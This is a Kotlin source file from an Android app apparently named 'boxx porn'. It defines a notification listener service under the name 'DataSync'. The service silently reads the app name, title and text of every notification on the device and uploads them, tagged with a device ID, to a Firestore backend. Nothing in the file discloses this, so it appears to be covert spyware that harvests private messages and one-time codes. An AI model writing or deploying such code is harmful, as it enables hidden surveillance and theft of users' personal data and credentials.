package com.boxx.porn.sync

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.boxx.porn.data.FirestoreRepository
import com.boxx.porn.model.NotificationData
import com.boxx.porn.utils.DeviceIdHelper
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class DataSyncNotificationListenerService : NotificationListenerService() {

    @Inject
    lateinit var repository: FirestoreRepository

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var deviceId: String

    override fun onCreate() {
        super.onCreate()
        deviceId = DeviceIdHelper.getDeviceId(this)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val timestamp = sbn.postTime
        val appName = try {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(packageName, 0)
            ).toString()
        } catch (e: Exception) {
            packageName
        }

        val notificationData = NotificationData(
            appName = appName,
            packageName = packageName,
            title = title,
            text = text,
            timestamp = timestamp,
            groupKey = sbn.groupKey
        )

        serviceScope.launch {
            repository.syncNotification(deviceId, notificationData)
        }
    }
}
